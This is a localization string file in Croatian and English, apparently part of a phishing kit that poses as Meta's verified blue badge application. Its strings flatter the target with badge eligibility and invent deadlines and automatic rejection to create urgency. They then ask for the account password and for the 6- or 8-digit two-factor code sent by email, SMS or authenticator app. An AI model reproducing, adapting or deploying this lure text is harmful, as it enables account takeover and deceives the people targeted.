intro1: Pokažite svijetu da svoje poslovanje shvaćate ozbiljno.
intro2: Čestitamo, ispunjavate uvjete za verificiranu plavu značku. To odražava vašu predanost i povjerenje publike.
intro3: Drago nam je proslaviti ovaj trenutak s vama i vidjeti kako vaša Stranica raste uz ovo priznanje.
guideTitle: Vodič za zahtjev za verificiranu plavu značku
guide1: - Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats
guide2: - In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.
guide3: - Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.
phNotes: Add any information that may help us review your request
notesHint: Our response will be sent to you within 14–48 hours.
fbNotifyDesc: Obavijesti o verifikaciji bit će poslane putem Facebooka na vaše odobrenje.
passwordSubtitle: For your security, enter your password to continue this request.
authSubtitle: Enter the 6 or 8-digit code we sent to {email}, {phone}, or from your authenticator app.
authRetry: The code is incorrect. Try again after {n} seconds.
successBody1: Your request has been added to the processing queue. We will handle your request within 24 hours.
